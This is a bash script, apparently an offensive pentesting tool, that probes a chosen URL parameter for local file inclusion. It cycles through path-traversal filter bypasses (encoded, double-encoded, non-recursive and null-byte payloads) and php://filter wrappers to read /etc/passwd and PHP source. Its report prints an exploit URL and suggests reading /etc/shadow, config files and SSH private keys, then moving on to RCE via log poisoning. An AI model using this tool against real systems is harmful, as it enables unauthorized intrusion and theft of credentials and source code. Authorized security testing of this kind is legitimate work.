#!/bin/bash

# LFI Vulnerability Scanner with Iterative Bypass Testing
# Usage: ./lfi_scanner.sh <URL> <PARAMETER>
# Example: ./lfi_scanner.sh "http://example.com/index.php" "language"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check arguments
if [ $# -lt 2 ]; then
    echo -e "${RED}Usage: $0 <URL> <PARAMETER>${NC}"
    echo "Example: $0 'http://example.com/index.php' 'language'"
    exit 1
fi

URL="$1"
PARAM="$2"
TEMP_DIR="/tmp/lfi_scan_$$"
mkdir -p "$TEMP_DIR"

# Test files to try
declare -a TEST_FILES=(
    "etc/passwd"
    "etc/hosts"
    "etc/hostname"
    "proc/version"
    "windows/win.ini"
)

# Banner
echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║         LFI Vulnerability Scanner v1.0                 ║${NC}"
echo -e "${BLUE}║         Iterative Bypass Testing                       ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[*] Target URL: ${URL}${NC}"
echo -e "${YELLOW}[*] Parameter: ${PARAM}${NC}"
echo ""

# Function to make request and save response
make_request() {
    local payload="$1"
    local output_file="$2"
    local full_url="${URL}?${PARAM}=${payload}"
    
    curl -s -L "$full_url" -o "$output_file" 2>/dev/null
    return $?
}

# Function to check if response contains success indicators
check_success() {
    local file="$1"
    local target="$2"
    
    # Check for common success indicators based on target file
    case "$target" in
        *"passwd"*)
            grep -q "root:.*:0:0:" "$file" && return 0
            grep -q "daemon:" "$file" && return 0
            ;;
        *"hosts"*)
            grep -q "127.0.0.1" "$file" && return 0
            grep -q "localhost" "$file" && return 0
            ;;
        *"win.ini"*)
            grep -q "\[fonts\]" "$file" && return 0
            grep -q "\[extensions\]" "$file" && return 0
            ;;
        *"version"*)
            grep -qi "linux" "$file" && return 0
            grep -qi "kernel" "$file" && return 0
            ;;
    esac
    
    return 1
}

# Function to detect filter type from response
detect_filter() {
    local response_file="$1"
    local payload="$2"
    
    # Check for error messages that reveal filter behavior
    if grep -q "failed to open stream" "$response_file" 2>/dev/null; then
        local path=$(grep -o "include([^)]*)" "$response_file" | head -1)
        echo -e "${YELLOW}[!] Detected include() error: ${path}${NC}"
        
        # Check if ../ was stripped
        if echo "$path" | grep -qv "\.\./"; then
            echo -e "${YELLOW}[!] Filter detected: ../ strings are being removed${NC}"
            return 1
        fi
        
        # Check if .php was appended
        if echo "$path" | grep -q "\.php"; then
            echo -e "${YELLOW}[!] Filter detected: .php extension is being appended${NC}"
            return 2
        fi
        
        # Check if path was modified
        if echo "$path" | grep -qv "$payload"; then
            echo -e "${YELLOW}[!] Filter detected: Path is being modified${NC}"
            return 3
        fi
    fi
    
    # Check for WAF/generic blocking
    if grep -qi "illegal\|forbidden\|blocked\|invalid" "$response_file" 2>/dev/null; then
        echo -e "${YELLOW}[!] Possible WAF/filter detected: Generic blocking message${NC}"
        return 4
    fi
    
    return 0
}

# Test basic LFI
echo -e "${BLUE}[PHASE 1] Testing Basic LFI${NC}"
echo "=========================================="

basic_payload="../../../../etc/passwd"
basic_output="${TEMP_DIR}/basic_test.html"

echo -e "${YELLOW}[*] Testing: ${basic_payload}${NC}"
make_request "$basic_payload" "$basic_output"

if check_success "$basic_output" "passwd"; then
    echo -e "${GREEN}[✓] SUCCESS! Basic LFI works - No filter detected${NC}"
    echo -e "${GREEN}[✓] Working payload: ${basic_payload}${NC}"
    echo -e "${GREEN}[✓] Full URL: ${URL}?${PARAM}=${basic_payload}${NC}"
    rm -rf "$TEMP_DIR"
    exit 0
else
    echo -e "${RED}[✗] Basic LFI blocked or unsuccessful${NC}"
    detect_filter "$basic_output" "$basic_payload"
    filter_type=$?
fi

echo ""

# Phase 2: Try bypass techniques
echo -e "${BLUE}[PHASE 2] Testing Bypass Techniques${NC}"
echo "=========================================="

# Define bypass payloads
declare -a BYPASS_TECHNIQUES=(
    "non_recursive:....//....//....//....//etc//passwd"
    "non_recursive_alt:..././..././..././..././etc/passwd"
    "non_recursive_backslash:....\/....\/....\/....\/etc/passwd"
    "url_encoded:%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "double_encoded:%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    "approved_path:./languages/../../../../etc/passwd"
    "approved_path_bypass:./languages/....//....//....//....//etc//passwd"
    "null_byte:../../../../etc/passwd%00"
    "approved_null:./languages/../../../../etc/passwd%00"
    "extra_slashes:..././..././..././..././etc/passwd"
    "mixed_encoding:..%2f..%2f..%2f..%2fetc%2fpasswd"
    "deep_traversal:../../../../../../../../../etc/passwd"
)

success=0
working_payload=""

for technique in "${BYPASS_TECHNIQUES[@]}"; do
    IFS=':' read -r name payload <<< "$technique"
    output_file="${TEMP_DIR}/${name}.html"
    
    echo -e "${YELLOW}[*] Trying: ${name}${NC}"
    echo -e "    Payload: ${payload}"
    
    make_request "$payload" "$output_file"
    
    # Check for success
    if check_success "$output_file" "passwd"; then
        echo -e "${GREEN}[✓] SUCCESS with ${name}!${NC}"
        working_payload="$payload"
        success=1
        break
    else
        echo -e "${RED}[✗] Failed${NC}"
    fi
    
    echo ""
done

echo ""

# Phase 3: Try alternative files if passwd didn't work
if [ $success -eq 0 ]; then
    echo -e "${BLUE}[PHASE 3] Testing Alternative Target Files${NC}"
    echo "=========================================="
    echo -e "${YELLOW}[*] /etc/passwd might be specifically blocked. Trying alternatives...${NC}"
    echo ""
    
    for file in "${TEST_FILES[@]}"; do
        # Skip passwd since we already tried it
        if [[ "$file" == *"passwd"* ]]; then
            continue
        fi
        
        echo -e "${YELLOW}[*] Testing file: /${file}${NC}"
        
        # Try multiple bypass techniques on this file
        for technique in "${BYPASS_TECHNIQUES[@]}"; do
            IFS=':' read -r name payload_template <<< "$technique"
            
            # Replace etc/passwd with current file
            payload="${payload_template//etc\/passwd/$file}"
            output_file="${TEMP_DIR}/${name}_${file//\//_}.html"
            
            make_request "$payload" "$output_file"
            
            if check_success "$output_file" "$file"; then
                echo -e "${GREEN}[✓] SUCCESS! Found alternative file: /${file}${NC}"
                echo -e "${GREEN}[✓] Working technique: ${name}${NC}"
                echo -e "${GREEN}[✓] Payload: ${payload}${NC}"
                working_payload="$payload"
                success=1
                break 2
            fi
        done
    done
fi

echo ""

# Phase 4: Try PHP filters for source code disclosure
if [ $success -eq 0 ]; then
    echo -e "${BLUE}[PHASE 4] Testing PHP Filter Wrappers${NC}"
    echo "=========================================="
    echo -e "${YELLOW}[*] Trying to read PHP source code with base64 filter...${NC}"
    echo ""
    
    # Try to read index.php source
    php_payloads=(
        "php://filter/read=convert.base64-encode/resource=index"
        "php://filter/read=convert.base64-encode/resource=config"
        "php://filter/read=convert.base64-encode/resource=../../../../var/www/html/index"
    )
    
    for payload in "${php_payloads[@]}"; do
        output_file="${TEMP_DIR}/php_filter.html"
        echo -e "${YELLOW}[*] Testing: ${payload}${NC}"
        
        make_request "$payload" "$output_file"
        
        # Check if response contains base64 data
        if grep -qE '[A-Za-z0-9+/]{50,}={0,2}' "$output_file"; then
            # Try to decode and check if it's valid PHP
            base64_content=$(grep -oE '[A-Za-z0-9+/]{50,}={0,2}' "$output_file" | head -1)
            decoded=$(echo "$base64_content" | base64 -d 2>/dev/null)
            
            if echo "$decoded" | grep -q "<?php"; then
                echo -e "${GREEN}[✓] SUCCESS! PHP source code disclosure possible${NC}"
                echo -e "${GREEN}[✓] Working payload: ${payload}${NC}"
                echo -e "${YELLOW}[*] Decoded content preview:${NC}"
                echo "$decoded" | head -10
                working_payload="$payload"
                success=1
                break
            fi
        fi
    done
fi

echo ""

# Final Report
echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║                    FINAL REPORT                        ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"
echo ""

if [ $success -eq 1 ]; then
    echo -e "${GREEN}[✓✓✓] LFI VULNERABILITY CONFIRMED [✓✓✓]${NC}"
    echo ""
    echo -e "${GREEN}Working Payload:${NC}"
    echo -e "  ${working_payload}"
    echo ""
    echo -e "${GREEN}Full Exploit URL:${NC}"
    echo -e "  ${URL}?${PARAM}=${working_payload}"
    echo ""
    echo -e "${YELLOW}Next Steps:${NC}"
    echo "  1. Try reading sensitive files:"
    echo "     - /etc/shadow (if running as root)"
    echo "     - /var/www/html/config.php"
    echo "     - /home/*/.ssh/id_rsa"
    echo "  2. Try reading source code with PHP filters"
    echo "  3. Attempt RCE via log poisoning or file upload"
    echo "  4. Check for RFI if allow_url_include is enabled"
else
    echo -e "${RED}[✗✗✗] NO LFI VULNERABILITY DETECTED [✗✗✗]${NC}"
    echo ""
    echo -e "${YELLOW}Possible reasons:${NC}"
    echo "  1. Parameter is not vulnerable to LFI"
    echo "  2. Strong filters are in place (try manual testing)"
    echo "  3. WAF is blocking requests"
    echo "  4. Application uses whitelist validation"
    echo ""
    echo -e "${YELLOW}Recommendations:${NC}"
    echo "  1. Try manual testing with Burp Suite"
    echo "  2. Fuzz with comprehensive LFI wordlists"
    echo "  3. Check for other parameters that might be vulnerable"
    echo "  4. Look for file upload + inclusion combinations"
fi

echo ""

# Cleanup
rm -rf "$TEMP_DIR"

exit $([ $success -eq 1 ] && echo 0 || echo 1)